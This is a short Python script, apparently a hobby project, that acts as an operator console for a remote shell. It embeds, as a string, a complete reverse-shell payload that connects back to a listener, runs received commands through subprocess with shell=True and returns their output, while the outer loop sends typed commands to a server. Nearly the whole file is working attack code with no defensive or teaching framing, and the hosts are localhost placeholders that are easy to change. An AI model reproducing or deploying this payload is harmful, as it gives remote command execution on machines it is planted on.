import socket

HOST = '127.0.0.1'  # The server's hostname or IP address
PORT = 9001 # The port used by the 
shell = """
import socket
import subprocess

s = socket.socket()
host = '127.0.0.1'
port = 4567

s.connect((host,port))

while True:
    data = s.recv(1024)
    rdata = data.decode()
    if not data:
        break
    cmd = subprocess.Popen(rdata,shell=True,stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    cmd_bytes = cmd.stdout.read() + cmd.stderr.read()
    cmd_r = str(cmd_bytes)
    s.send(cmd_r.encode())
    
s.close()
"""


s = socket.socket()
s.connect((HOST, PORT))
print("connected...")
msg=input('> ')
while msg != 'e':
    if not msg:
        msg=input("> ")
        continue
        
    s.send(msg.encode())
    data = s.recv(1024)
    print(data.decode())
    msg = input("> ")
    
s.close()
#print('Received', data.decode('utf-8'))

